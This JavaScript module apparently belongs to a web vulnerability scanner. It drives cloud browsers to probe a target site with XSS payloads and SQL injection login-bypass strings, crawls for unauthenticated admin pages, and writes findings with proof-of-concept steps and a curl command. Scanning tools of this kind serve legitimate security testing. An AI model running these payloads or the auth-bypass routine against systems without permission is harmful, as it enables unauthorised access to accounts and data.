/**
 * BrowserBot — Browserbase-powered real-browser attack engine.
 * Creates stealth cloud-browser sessions, walks the app like a human,
 * probes forms/inputs with exploit payloads, verifies execution via JS eval,
 * and captures screenshot evidence for every finding.
 *
 * Free plan: 3 concurrent sessions, 300s max. We use max 2 sessions per scan.
 */
const { chromium } = require('playwright-core');

const PROJECT_ID = 'b538600c-870b-4322-bc9a-e41c2f390ab6';

function timeoutFetch(url, opts = {}, ms = 15000) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  return fetch(url, { ...opts, signal: c.signal }).finally(() => clearTimeout(t));
}

function now() { return Date.now(); }

function makeFinding(o) {
  return {
    id: o.id, tool: o.tool || 'browserbot', phase: 'browser',
    severity: o.severity, title: o.title, desc: o.desc || '',
    evidence: o.evidence, poc: o.poc || null, screenshot: o.screenshot || null,
  };
}

// ---------------- Browserbase session helpers ----------------
const BBKEY = () => process.env.BROWSERBASE_API_KEY || '';

async function createSession() {
  const r = await fetch('https://api.browserbase.com/v1/sessions', {
    method: 'POST',
    headers: { 'x-bb-api-key': BBKEY(), 'Content-Type': 'application/json' },
    body: JSON.stringify({ projectId: PROJECT_ID, timeout: 180 }),
  });
  if (!r.ok) throw new Error(`session create ${r.status}`);
  return r.json();
}

async function connectBrowser(sessionId) {
  const info = await fetch(`https://api.browserbase.com/v1/sessions/${sessionId}`, {
    headers: { 'x-bb-api-key': BBKEY() },
  }).then(r => r.json());
  return chromium.connectOverCDP(info.connectUrl);
}

// ---------------- global session queue (free plan: 3 concurrent; we run 1 per instance) ----------------
const sessionQueue = { chain: Promise.resolve(), queued: 0 };

function enqueueBrowser(job, onPhase) {
  const pos = ++sessionQueue.queued;
  if (pos > 1 && onPhase) onPhase({
    phase: 'browser-queue', status: 'waiting', position: pos - 1,
    note: 'Position ' + (pos - 1) + ' in queue — one browser session at a time (free plan limit). Your scan continues with all other checks meanwhile.',
  });
  else if (onPhase) onPhase({ phase: 'browser-queue', status: 'ready', position: 0, note: 'Browser session starting now' });
  const run = sessionQueue.chain.then(async () => {
    try { return await job(); }
    finally { sessionQueue.queued = Math.max(0, sessionQueue.queued - 1); }
  });
  sessionQueue.chain = run.catch(() => {});
  return run;
}

// ---------------- payload kit ----------------
const XSS_PROBES = [
  { v: `"><svg/onload=window.__bbx=1>`, t: 'attr breakout' },
  { v: `';window.__bbx=1;//`, t: 'js context' },
  { v: `<img src=x onerror=window.__bbx=1>`, t: 'img onerror' },
  { v: `javascript:window.__bbx=1`, t: 'js uri' },
  { v: `</script><script>window.__bbx=1</script>`, t: 'script breakout' },
];

const SQLI_LOGIN_PROBES = [
  { u: `admin'--`, p: 'x' },
  { u: `admin'-- -`, p: 'x' },
  { u: `' OR '1'='1`, p: `' OR '1'='1` },
  { u: `' OR 1=1--`, p: 'x' },
  { u: `') OR ('1'='1`, p: 'x' },
  { u: `admin'#`, p: 'x' },
];

const CANARY = 'bbx' + Math.random().toString(36).slice(2, 10);

function filledForm(page, probes) {
  return page.evaluate((canary) => {
    const f = document.querySelector('form');
    if (!f) return null;
    return {
      action: f.action, method: (f.method || 'get').toUpperCase(),
      inputs: Array.from(f.querySelectorAll('input,textarea')).map(i => ({
        name: i.name, type: i.type, value: i.value, required: i.required,
      })),
      selects: Array.from(f.querySelectorAll('select')).map(s => ({ name: s.name, opts: s.options.length })),
    };
  }, CANARY);
}

async function safeGoto(page, url, ms = 20000) {
  try { await page.goto(url, { waitUntil: 'domcontentloaded', timeout: ms }); return true; }
  catch { return false; }
}

// ---------------- module: auth bypass via real browser ----------------
async function moduleAuthBypass(url, page, log) {
  const out = [];
  const base = new URL(url);
  const loginUrls = [];
  // try obvious login paths via browser
  for (const p of ['/login', '/signin', '/admin/login', '/user/login', '/wp-login.php', '/auth/login', '/userinfo.php', '/login.php', '/signin.php', '/account/login', '/members/login']) {
    const u = new URL(url); u.pathname = p; loginUrls.push(u.toString());
  }
  // discover login links from homepage
  try {
    if (await safeGoto(page, url, 15000)) {
      const links = await page.evaluate(() =>
        Array.from(document.querySelectorAll('a[href]'))
          .map(a => a.href)
          .filter(h => /login|signin|sign-in|auth|user|account|admin/i.test(h))
          .slice(0, 5)
      );
      loginUrls.push(...links);
    }
  } catch {}
  const seen = new Set();
  const uniqLogins = loginUrls.filter(u => { if (seen.has(u)) return false; seen.add(u); return true; }).slice(0, 8);
  for (const lu of uniqLogins) {
    if (!(await safeGoto(page, lu, 12000))) continue;
    const form = await filledForm(page);
    if (!form || form.inputs.length < 2) continue;
    const pwd = form.inputs.find(i => i.type === 'password');
    if (!pwd) continue;

    for (const probe of SQLI_LOGIN_PROBES) {
      try {
        await page.evaluate(() => { const f = document.querySelector('form'); if (f) f.reset(); });
        const uName = form.inputs.find(i => i.type === 'text' || i.type === 'email') || form.inputs[0];
        await page.fill(`input[name="${uName.name}"]`, probe.u);
        await page.fill(`input[name="${pwd.name}"]`, probe.p || probe.pwd || 'x');
        const preUrl = page.url();
        await Promise.race([
          Promise.all([page.waitForNavigation({ timeout: 8000 }).catch(() => null), page.click('form button, form input[type=submit]')]),
          new Promise(r => setTimeout(r, 9000)),
        ]);
        const postUrl = page.url();
        const cookies = await page.context().cookies(postUrl);
        const gotSess = cookies.some(c => /sess|auth|token|jwt|login/i.test(c.name));
        const stillLogin = /login|signin/i.test(postUrl);
        if (gotSess && !stillLogin) {
          const sshot = await page.screenshot({ fullPage: false }).catch(() => null);
          out.push(makeFinding({
            id: `bb-authbypass-${probe.u.slice(0, 10).replace(/\W/g, '')}`,
            severity: 'critical',
            title: `LOGIN BYPASS — "${probe.u}" on ${lu}`,
            desc: `Form at ${lu} accepted injection "${probe.u}" and granted an authenticated session.`,
            evidence: {
              before: preUrl, after: postUrl,
              cookies: cookies.map(c => c.name).slice(0, 8),
              body: (await page.content()).length,
            },
            poc: {
              steps: [
                `1. Open ${lu}`,
                `2. Enter username: ${probe.u}`,
                `3. Enter any password (e.g. "x")`,
                `4. Submit — you land on ${postUrl} with a session cookie`,
                `5. Confirm: cookie set: ${cookies.filter(c => /sess|auth|token|jwt/i.test(c.name)).map(c => c.name).join(', ')}`,
              ],
              curl: `curl -sk -X POST '${lu}' -d 'username=${encodeURIComponent(probe.u)}&password=x' -i | head -5`,
            },
            screenshot: sshot ? sshot.toString('base64').slice(0, 4000) : null,
          }));
          return out; // one confirmed bypass is enough
        }
      } catch (e) { log.push(`authbypass: ${e.message}`); }
    }
  }
  return out;
}

function authed(cookies) {
  const sess = cookies.filter(c => /sess|auth|token|jwt|login|id/i.test(c.name));
  if (!sess.length) return null;
  return { authed: true, names: sess.map(c => c.name) };
}

// ---------------- module: DOM XSS via real browser ----------------
async function moduleDomXss(url, page, log) {
  const out = [];
  if (!(await safeGoto(page, url, 15000))) return out;
  const params = Array.from(new URL(url).searchParams.keys()).slice(0, 6);
  if (!params.length) {
    // probe common params on same page
    params.push('q', 'search', 'name', 'id', 'msg', 'text', 'redirect');
  }
  for (const param of params) {
    for (const probe of XSS_PROBES.slice(0, 3)) {
      try {
        const u = new URL(url);
        u.searchParams.set(param, CANARY + probe.v);
        if (!(await safeGoto(page, u.toString(), 12000))) continue;
        const fired = await page.evaluate(() => window.__bbx === 1 || window.__bbx === true);
        if (fired) {
          const sshot = await page.screenshot().catch(() => null);
          out.push(makeFinding({
            id: `bb-domxss-${param}-${probe.t.replace(/\W/g, '')}`,
            severity: 'high',
            title: `DOM XSS EXECUTED — param "${param}" (${probe.t})`,
            desc: `Payload executed in live browser (window.__bbx set). URL: ${u.toString().slice(0, 150)}`,
            evidence: { url: u.toString(), execution: 'window.__bbx === true', payload: probe.v },
            poc: { steps: [`1. Open ${u.toString()}`, '2. JS executes on page load — no user interaction needed'] },
            screenshot: sshot ? sshot.toString('base64').slice(0, 4000) : null,
          }));
        }
      } catch (e) { log.push(`domxss: ${e.message}`); }
    }
  }
  return out;
}

// ---------------- module: click-path + sensitive UI reachability ----------------
async function moduleClickPath(url, page, dirFindings, log) {
  const out = [];
  if (!(await safeGoto(page, url, 15000))) return out;
  try {
    // collect links
    const links = await page.evaluate(() => Array.from(document.querySelectorAll('a[href]')).map(a => a.href).filter(h => h && !h.startsWith('#')).slice(0, 25));
    const sensitive = links.filter(l => /admin|dashboard|panel|config|settings|users|api|backup|debug|internal|phpinfo|\.env|\.git|secret/i.test(l));
    for (const s of sensitive.slice(0, 6)) {
      try {
        const res = await page.goto(s, { waitUntil: 'domcontentloaded', timeout: 12000 }).catch(() => null);
        if (!res) continue;
        const status = res.status();
        const content = await page.content();
        const leak = /admin|dashboard|phpinfo|root|x:0:0|password|secret|token|debug|stack ?trace|SQL/i.test(content) && content.length > 400;
        if (status === 200 && leak) {
          const sshot = await page.screenshot().catch(() => null);
          const title = await page.title().catch(() => '');
          out.push(makeFinding({
            id: `bb-clickpath-${s.replace(/\W/g, '').slice(0, 20)}`,
            severity: 'medium',
            title: `SENSITIVE PAGE REACHABLE (unauthenticated): ${new URL(s).pathname}`,
            desc: `HTTP ${status} — page contains admin/sensitive content, reachable without login via link from ${url}`,
            evidence: { url: s, status, title, bodyPreview: content.slice(0, 300) },
            poc: { steps: [`1. Visit ${s} in a private browser window`, `2. Page loads with HTTP ${status} — no authentication required`] },
            screenshot: sshot ? sshot.toString('base64').slice(0, 4000) : null,
          }));
        }
      } catch (e) { log.push(`clickpath: ${e.message}`); }
    }
  } catch (e) { log.push(`clickpath-outer: ${e.message}`); }
  return out;
}

// ---------------- module: form probing (reflected XSS + open redirect via real browser) ----------------
async function moduleFormProbe(url, page, log) {
  const out = [];
  if (!(await safeGoto(page, url, 15000))) return out;
  try {
    const hasForm = await page.evaluate(() => !!document.querySelector('form'));
    if (!hasForm) return out;
    const form = await filledForm(page);
    if (!form) return out;
    const uName = form.inputs.find(i => i.type === 'text' || i.type === 'email' || i.name) || form.inputs[0];
    if (!uName) return out;
    // reflected XSS in search-style fields
    const probe = `<svg/onload=window.__bbx=1>`;
    try {
      await page.fill(`input[name="${uName.name}"]`, probe);
      await Promise.race([page.click('form button, form input[type=submit]'), new Promise(r => setTimeout(r, 3000))]);
      await page.waitForTimeout(1500);
      const fired = await page.evaluate(() => window.__bbx === 1);
      if (fired) {
        const sshot = await page.screenshot().catch(() => null);
        out.push(makeFinding({
          id: `bb-formxss-${uName.name}`,
          severity: 'high',
          title: `REFLECTED XSS EXECUTED via form field "${uName.name}"`,
          desc: `Submitted payload executed in browser after form submit on ${url}`,
          evidence: { form: form.action, field: uName.name, payload: probe, url: page.url() },
          poc: { steps: [`1. Open ${form.action}`, `2. Type <svg/onload=alert(1)> into "${uName.name}"`, '3. Submit — JS executes'] },
          screenshot: sshot ? sshot.toString('base64').slice(0, 4000) : null,
        }));
      }
    } catch (e) { log.push(`formprobe: ${e.message}`); }
  } catch (e) { log.push(`formprobe-outer: ${e.message}`); }
  return out;
}

// ---------------- orchestrator ----------------
async function runBrowserBot({ url, dirFindings = [], onPhase }) {
  const findings = [];
  const logs = [];
  const phases = [];
  if (!BBKEY()) {
    return { findings, phases: [{ phase: 'browser', status: 'skipped', note: 'BROWSERBASE_API_KEY not set' }], logs: [] };
  }
  return enqueueBrowser(async () => {
  let browser = null;
  let sessionId = null;
  try {
    onPhase && onPhase({ phase: 'browser', status: 'starting' });
    const sess = await createSession();
    sessionId = sess.id;
    browser = await connectBrowser(sessionId);
    const context = browser.contexts()[0];
    const page = context.pages()[0] || await context.newPage();
    await page.setViewportSize({ width: 1440, height: 900 });

    const track = async (name, fn) => {
      const t0 = now();
      try {
        const got = await fn();
        findings.push(...(got || []));
        phases.push({ phase: name, status: 'ok', ms: now() - t0, hits: (got || []).length });
      } catch (e) {
        phases.push({ phase: name, status: 'error', ms: now() - t0 });
        logs.push(String(e.message || e));
      }
    };
    const logs = [];

    await track('dom-xss', () => moduleDomXss(url, page, logs));
    await track('auth-bypass', () => moduleAuthBypass(url, page, logs));
    await track('click-path', () => moduleClickPath(url, page, dirFindings, logs));
    await track('form-probe', () => moduleFormProbe(url, page, logs));

    return { findings, phases, logs };
  } catch (e) {
    return { findings, phases: [...phases, { phase: 'browser', status: 'error', note: String(e.message) }], logs: [String(e.stack || e)] };
  } finally {
    if (sessionId) {
      fetch(`https://api.browserbase.com/v1/sessions/${sessionId}`, {
        method: 'PUT',
        headers: { 'x-bb-api-key': BBKEY(), 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: 'REQUEST_RELEASE' }),
      }).catch(() => {});
    }
    if (browser) { try { await browser.close(); } catch {} }
  }
  }, onPhase);
}

module.exports = { runBrowserBot, makeFinding, CANARY };